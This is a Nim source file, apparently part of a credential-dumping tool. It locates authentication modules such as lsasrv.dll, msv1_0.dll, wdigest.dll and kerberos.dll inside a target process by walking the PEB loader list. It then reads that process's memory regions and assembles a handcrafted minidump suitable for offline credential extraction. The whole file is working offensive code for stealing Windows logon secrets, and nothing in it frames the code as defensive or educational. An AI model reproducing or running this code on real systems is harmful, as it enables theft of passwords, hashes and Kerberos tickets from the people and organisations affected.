import 
    winim,
    Helper,
    ptr_math,
    std/[sequtils, strutils]

type
    MinidumpHeader {.pure.} = object
        Signature: uint32
        Version: uint32
        NumberOfStreams: uint32
        StreamDirectoryRVA: int32
        CheckSum: uint32
        TimeDateStamp: uint32
        Flags: uint64

    MinidumpStreamDirectory {.pure.} = object
        StreamType: uint32
        Size: uint32
        Location: DWORD
    
    MinidumpModuleListStream {.pure, packed.} = object
        NumberOfModules: ULONG32
        BaseAddress: ULONG64
        Size: ULONG32
        Reserved1: uint
        TimeStamp: ULONG32
        PointerName: DWORD
        Reserved2: uint
        Reserved3: uint
        Reserved4: uint
        Reserved5: uint
        Reserved6: uint
        Reserved7: uint
        Reserved8: uint
        Reserved9: uint
        Reserved10: uint
        Reserved11: uint

    MinidumpMemory64ListStream {.pure.} = object
        NumberOfEntries: ULONG64
        MemoryRegionsBaseAddress: DWORD64

    MinidumpSysInfoStream {.pure.} = object
        ProcessorArchitecture: USHORT
        ProcessorLevel: USHORT
        ProcessorRevision: USHORT
        NumberOfProcessors: BYTE
        ProductType: BYTE
        MajorVersion: ULONG32
        MinorVersion: ULONG32
        BuildNumber: ULONG32
        PlatformId: ULONG32
        Reserved1: DWORD
        Reserved2: UINT
        ProcessorFeatures: int
        ProcessorFeatures2: int
        Reserved3: UINT
        Reserved4: USHORT
        Reserved5: BYTE

    Memory64Info* = object
        Address*: int64
        Size*: int64

    ModulesInfo* = tuple
        Name: string
        BaseAddress: int
        Size: int

const importantModules*: array[18, string] = ["lsasrv.dll", "msv1_0.dll", "tspkg.dll", "wdigest.dll", "kerberos.dll", "livessp.dll", "dpapisrv.dll", "kdcsvc.dll", "cryptdll.dll", "lsadb.dll", "samsrv.dll", "rsaenh.dll", "ncrypt.dll", "ncryptprov.dll", "eventlog.dll", "wevtsvc.dll", "termsrv.dll", "cloudap.dll"]

const procMaxAddress*: int64 = 0x7FFFFFFEFFFF
var memoryAddress*: int64 = 0
var tempBuffer*: seq[byte]

var 
    modulesInfo*: seq[ModulesInfo]
    importantBaseAddresses*: seq[int]
    lsasrvAddress*: int
    lsasrvSize*: int = 0
    memRegionsBuffer*: seq[byte]
    memory64InfoList*: seq[Memory64Info]

var
    peb*: pointer
    pLdr*: pointer
    ldr*: int 
    flink*: int
    nextFlinkAddr*: int
    pDllNameBuffer*: (string, int)
    dllName*: string
    dllBase*: (string, int)
    dllSize*: (string, int)
    contentsSeq*: seq[byte]
    contents*: array[62, byte]
    pRemoteAddr*: array[8, byte]
    ptrStringValue*: string
    ptrIntValue*: int
    contentsString*: string
    extensionPosition*: int
    count: int = 0

var pbi*: PROCESS_BASIC_INFORMATION

var mbi*: MEMORY_BASIC_INFORMATION

var boolTest: bool = false

proc isImportantAddress*(addressToCheck: int): bool = 
    for module in modulesInfo:
        var 
            startAddress: int = module.BaseAddress
            endAddress: int = module.BaseAddress + module.Size

        if addressToCheck >= startAddress and addressToCheck <= endAddress:
            return true
    return false

proc getRemotePtr*(hProcess: HANDLE, address: pointer): (string, int) =
    status = NtReadVirtualMemory(hProcess, address, pRemoteAddr[0].addr, 8, NULL)

    if NT_SUCCESS(status):
        for i in countdown(7, 0):
            ptrStringValue.add(toHex(pRemoteAddr[i].int, 2))
        ptrIntValue = parseHexInt(ptrStringValue)

        return (ptrStringValue, ptrIntValue)
    else:
        echo "[-] Failed Retrieving Remote Pointer! Error: 0x", toHex($status)
        return ("", -1)

proc getRemoteBufferContents*(hProcess: HANDLE, address: pointer): string =
    status = NtReadVirtualMemory(hProcess, address, contents[0].addr, 62, NULL)
    if NT_SUCCESS(status):
        # Clean up the array
        contentsSeq = toSeq(contents.toOpenArray(0, 52))
        contentsSeq.keepIf(proc(x: byte): bool = x in @[0x41.byte, 0x42.byte, 0x43.byte, 0x44.byte, 0x45.byte, 0x46.byte, 0x47.byte, 
                    0x48.byte, 0x49.byte, 0x4A.byte, 0x4B.byte, 0x4C.byte, 0x4D.byte, 0x4E.byte, 0x4F.byte, 0x50.byte, 0x51.byte, 0x52.byte, 
                    0x53.byte, 0x54.byte, 0x55.byte, 0x56.byte, 0x57.byte, 0x58.byte, 0x59.byte, 0x5A.byte, 0x61.byte, 0x62.byte, 0x63.byte, 
                    0x64.byte, 0x65.byte, 0x66.byte, 0x67.byte, 0x68.byte, 0x69.byte, 0x6A.byte, 0x6B.byte, 0x6C.byte, 0x6D.byte, 0x6E.byte, 
                    0x6F.byte, 0x70.byte, 0x71.byte, 0x72.byte, 0x73.byte, 0x74.byte, 0x75.byte, 0x76.byte, 0x77.byte, 0x78.byte, 0x79.byte, 0x7A.byte, 0x2E.byte]) 
        contentsString = toString(contentsSeq)
        extensionPosition = find(toLower(contentsString), ".dll")

        if extensionPosition != -1:
            contentsString.delete(extensionPosition+4..contentsString.high)
        return contentsString
    else:
        return ""

# Don't touch. Extremely delicate and finnicky due to whitespacing #
proc getMemoryRegions*(hProcess: HANDLE): void =
    while memoryAddress < procMaxAddress:
        var mbi: MEMORY_BASIC_INFORMATION
        status = NtQueryVirtualMemory(hProcess, cast[LPVOID](memoryAddress), 0, addr mbi, cast[SIZE_t](sizeof mbi), cast[PSIZE_T](NULL))
        
        if not NT_SUCCESS(status):
            echo "[-] Memory Region Query Failed! Error: 0x", toHex($status)

        if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT:
            if cast[int](mbi.BaseAddress) == lsasrvAddress:
                boolTest = true

            if boolTest:
                if mbi.RegionSize == 0x1000 and cast[int](mbi.BaseAddress) != lsasrvAddress:
                    boolTest = false
                else:
                    lsasrvSize = lsasrvSize + mbi.RegionSize.int

            if mbi.Type == MEM_MAPPED: 
                memoryAddress = cast[int64](mbi.BaseAddress + mbi.RegionSize.int)
                continue
                
            if mbi.Protect == PAGE_GUARD: 
                memoryAddress = cast[int64](mbi.BaseAddress + mbi.RegionSize.int)
                continue

            if mbi.Type == MEM_IMAGE and isImportantAddress(cast[int](mbi.BaseAddress)) == false:
                memoryAddress = cast[int64](mbi.BaseAddress + mbi.RegionSize.int)
                continue

            var bufferSize = mbi.RegionSize
            tempBuffer = newSeq[byte](bufferSize)
            status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, tempBuffer[0].addr, bufferSize, NULL)
            # If no errors
            if (status != 0 and status != 0x8000000D) != true:
                if tempBuffer.all(proc(x: byte): bool = x == 0x00.byte):
                    memoryAddress = cast[int64](mbi.BaseAddress + mbi.RegionSize.int)
                    continue

                var mem64Info: Memory64Info
                mem64Info.Address = cast[int64](mbi.BaseAddress)
                mem64Info.Size = mbi.RegionSize
                memory64InfoList.add(mem64Info)
                memRegionsBuffer.add(tempBuffer)

        memoryAddress = cast[int64](mbi.BaseAddress + mbi.RegionSize.int)

proc getImportantModulesInfo*(hProcess: HANDLE): void =
    status = NtQueryInformationProcess(hProcess, 0, addr pbi, cast[ULONG](sizeof(PROCESS_BASIC_INFORMATION)), NULL)

    if NT_SUCCESS(status):
        peb = cast[pointer](pbi.PebBaseAddress)
        pLdr = peb + 0x18
        ldr = getRemotePtr(hProcess, pLdr)[1]
        flink = getRemotePtr(hProcess, cast[pointer](ldr + 0x30))[1]
        
        nextFlinkAddr = flink
        nextFlinkAddr = getRemotePtr(hProcess, cast[pointer](nextFlinkAddr))[1]

        while nextFlinkAddr != flink:
            pDllNameBuffer = getRemotePtr(hProcess, cast[pointer](nextFlinkAddr + 0x30))
            dllName = getRemoteBufferContents(hProcess, cast[pointer](pDllNameBuffer[1] + 40))
            
            for moduleName in importantModules:
                if moduleName in toLower(dllName):
                    dllBase = getRemotePtr(hProcess, cast[pointer](nextFlinkAddr + 0x10))
                    dllSize = getRemotePtr(hProcess, cast[pointer](nextFlinkAddr + 0x20))

                    if toLower(dllName) == importantModules[0]:
                        lsasrvAddress = dllBase[1]
                    importantBaseAddresses.add(dllBase[1])
                    try:
                        modulesInfo.add( (dllName, parseHexInt(dllBase[0]), parseHexInt(dllSize[0])) )
                    except: 
                        echo "[-] Error Adding Found Module!"
                    
            nextFlinkAddr = getRemotePtr(hProcess, cast[pointer](nextFlinkAddr))[1]
            count += 1
    else:
        echo "[-] Could Not Retrieve Module Information! Error: 0x", toHex($status)
        echo "[!] Quitting..."
        quit(1)


proc CreateDump*(lsasrvAddress: int, lsasrvSize: int, mem64InfoList: seq[Memory64Info], memoryBuffer: seq[byte], memoryBufferSize: int, osVersionInfo: OSVERSIONINFOEX): seq[byte] =
    # Header
    var header: MinidumpHeader
    header.Signature = 0x50_4D_44_4D
    header.Version = 0xA793
    header.NumberOfStreams = 0x3
    header.StreamDirectoryRva = sizeof(header).int32 #0x20

    # Stream Directories

    # Module List Stream Directory
    var mdStreamDirectoryEntry1: MinidumpStreamDirectory
    mdStreamDirectoryEntry1.StreamType = 0x4
    mdStreamDirectoryEntry1.Size = 112

    # System Info Stream Directory
    var mdStreamDirectoryEntry2: MinidumpStreamDirectory
    mdStreamDirectoryEntry2.StreamType = 0x7
    mdStreamDirectoryEntry2.Size = 56
 
    # Memory 64 List Stream Directory
    var mdStreamDirectoryEntry3: MinidumpStreamDirectory
    mdStreamDirectoryEntry3.StreamType = 0x9
    # Size of stream entry + size of struct * number of entries (16 + 16 * mem64InfoList.len)
    mdStreamDirectoryEntry3.Size = (sizeof(MinidumpStreamDirectory) + sizeof(Memory64Info) * mem64InfoList.len).uint32

    # System Info Stream
    var sysInfoStream: MinidumpSysInfoStream
    sysInfoStream.ProcessorArchitecture = 0x9
    sysInfoStream.MajorVersion = osVersionInfo.dwMajorVersion
    sysInfoStream.MinorVersion = osVersionInfo.dwMinorVersion
    sysInfoStream.BuildNumber = osVersionInfo.dwBuildNumber
    
    # Module List Stream
    var modListStream: MinidumpModuleListStream
    
    modListStream.NumberOfModules = 1
    modListStream.BaseAddress = cast[ULONG64](lsasrvAddress)
    modListStream.Size = cast[ULONG32](lsasrvSize) # 4 + number of modules * sizeof each module
    modListStream.PointerName = 0xE8

    # Memory 64 List Stream
    var
        numberOfEntries: int = mem64InfoList.len
        memory64ListStream: MinidumpMemory64ListStream
    
    memory64ListStream.NumberOfEntries = numberOfEntries

    # Update Offsets
    mdStreamDirectoryEntry1.Location = sizeof(header) + sizeof(mdStreamDirectoryEntry1) + sizeof(sysInfoStream) + sizeof(mdStreamDirectoryEntry2) + sizeof(mdStreamDirectoryEntry3)
    mdStreamDirectoryEntry2.Location = sizeof(header) + sizeof(mdStreamDirectoryEntry1) + sizeof(mdStreamDirectoryEntry2) + sizeof(mdStreamDirectoryEntry3)
    # 0x3E is the length of the lsasrv full path unicode string plus 2 bytes for the buffer length value
    mdStreamDirectoryEntry3.Location = sizeof(header) + sizeof(mdStreamDirectoryEntry1) + sizeof(mdStreamDirectoryEntry2) + sizeof(mdStreamDirectoryEntry3) + sizeof(sysInfoStream) + sizeof(modListStream) + 0x3E
    
    var memRegionsOffset: uint = (mdStreamDirectoryEntry3.Location + sizeof(memory64ListStream) + (16 * (numberOfEntries))).uint

    memory64ListStream.MemoryRegionsBaseAddress = cast[int64](memRegionsOffset)

    var mem64ListStreamByteArray = @(cast[ptr UncheckedArray[byte]](addr memory64ListStream).toOpenArray(0, sizeof(memory64ListStream)-1))

    for i in 0 ..< mem64InfoList.len:
        var mem64InfoItem: Memory64Info = mem64InfoList[i]
        mem64ListStreamByteArray = mem64ListStreamByteArray.concat(@(cast[ptr UncheckedArray[byte]]((addr mem64InfoItem)).toOpenArray(0, sizeof(mem64InfoItem)-1)))

    # Create Complete Minidump Byte Seq
    var minidump: seq[byte]
    # Add header
    minidump.add(@(cast[ptr UncheckedArray[byte]](addr header).toOpenArray(0, sizeof(header)-1)))
    #echo "Header byte array added!"
    # Add Stream Directories
    minidump.add(@(cast[ptr UncheckedArray[byte]](addr mdStreamDirectoryEntry1).toOpenArray(0, sizeof(mdStreamDirectoryEntry1)-1)))
    minidump.add(@(cast[ptr UncheckedArray[byte]](addr mdStreamDirectoryEntry2).toOpenArray(0, sizeof(mdStreamDirectoryEntry2)-1)))
    minidump.add(@(cast[ptr UncheckedArray[byte]](addr mdStreamDirectoryEntry3).toOpenArray(0, sizeof(mdStreamDirectoryEntry3)-1)))
    minidump.add(@(cast[ptr UncheckedArray[byte]](addr sysInfoStream).toOpenArray(0, sizeof(sysInfoStream)-1)))
    # Add Module List Stream
    minidump.add(@(cast[ptr UncheckedArray[byte]](addr modListStream).toOpenArray(0, sizeof(modListStream)-1)))
    # Extra Null Bytes Negatively Affect Location of "PointerName" struct member
    minidump.delete(148..151)
    
    # Unicode String for lsasrv.dll full path
    minidump.add(@[0x3c.byte, 0x00.byte, 0x00.byte, 0x00.byte, 0x43.byte, 0x00.byte, 0x3a.byte, 0x00.byte, 0x5c.byte, 0x00.byte, 0x57.byte, 0x00.byte, 0x69.byte, 0x00.byte, 0x6e.byte, 0x00.byte, 0x64.byte, 0x00.byte, 0x6f.byte, 0x00.byte, 0x77.byte, 0x00.byte, 0x73.byte, 0x00.byte,
    0x5c.byte, 0x00.byte, 0x53.byte, 0x00.byte, 0x79.byte, 0x00.byte, 0x73.byte, 0x00.byte, 0x74.byte, 0x00.byte, 0x65.byte, 0x00.byte, 0x6d.byte, 0x00.byte, 0x33.byte, 0x00.byte, 0x32.byte, 0x00.byte, 0x5c.byte, 0x00.byte, 0x6c.byte, 0x00.byte, 0x73.byte, 0x00.byte, 0x61.byte, 0x00.byte, 0x73.byte, 0x00.byte, 0x72.byte, 0x00.byte,
    0x76.byte, 0x00.byte, 0x2e.byte, 0x00.byte, 0x64.byte, 0x00.byte, 0x6c.byte, 0x00.byte, 0x6c.byte, 0x00.byte, 0x00.byte, 0x00.byte])
    
    
    # Add Memory 64 List Stream
    minidump.add(mem64ListStreamByteArray)
    # Add Memory Regions
    minidump.add(memoryBuffer)
    return minidump
